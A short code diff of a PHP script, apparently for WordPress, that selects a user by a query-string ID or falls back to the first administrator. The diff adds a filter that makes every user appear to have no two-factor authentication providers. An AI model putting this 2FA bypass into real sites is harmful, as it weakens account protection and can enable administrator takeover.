@@ -72,7 +72,7 @@ if (isset($_GET['user_id'])) {
         'role' => 'administrator',
         'fields' => 'id',
         'orderby' => 'ID',
-        'order' => 'ASC',
+        'order' => 'ASC'
     ));
 
     if (empty($users) || !isset($users[0]) || !is_numeric($users[0])) {
@@ -86,6 +86,13 @@ if (!$user) {
 }
 
 /* Disable two-factor auth */
+
+add_filter('get_user_metadata', function ($value, $user_id, $meta_key, $single) {
+    if ($meta_key === '_two_factor_enabled_providers') {
+        return array();
+    }
+    return $value;
+}, 99, 4);
 add_filter('two_factor_providers', '__return_empty_array', 10, 1);
 add_filter('wp_2fa_user_enabled_methods', '__return_empty_array', 10, 1);
 
